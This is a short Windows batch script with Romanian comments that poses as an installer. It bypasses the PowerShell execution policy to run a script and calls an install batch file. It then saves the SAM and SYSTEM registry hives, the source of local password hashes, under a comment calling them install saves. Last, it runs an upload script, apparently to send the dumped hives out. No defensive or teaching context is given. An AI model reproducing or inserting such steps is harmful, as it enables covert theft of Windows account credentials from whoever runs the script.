@echo off
setlocal ENABLEDELAYEDEXPANSION

REM Obține locația scriptului curent
set SCRIPT_DIR=%~dp0

REM Mergi la directorul scriptului
cd /d "%SCRIPT_DIR%"

REM Rulează scriptul PowerShell
powershell -ExecutionPolicy Bypass -File intialize.ps1

REM Instalează dependențele (dacă este necesar)
call install.bat

REM Instalează save-uri
powershell -Command "reg save HKLM\sam ./sam.save"
powershell -Command "reg save HKLM\system ./system.save"

REM Rulează scriptul Python pentru încărcarea fișierelor
py upload.py

pause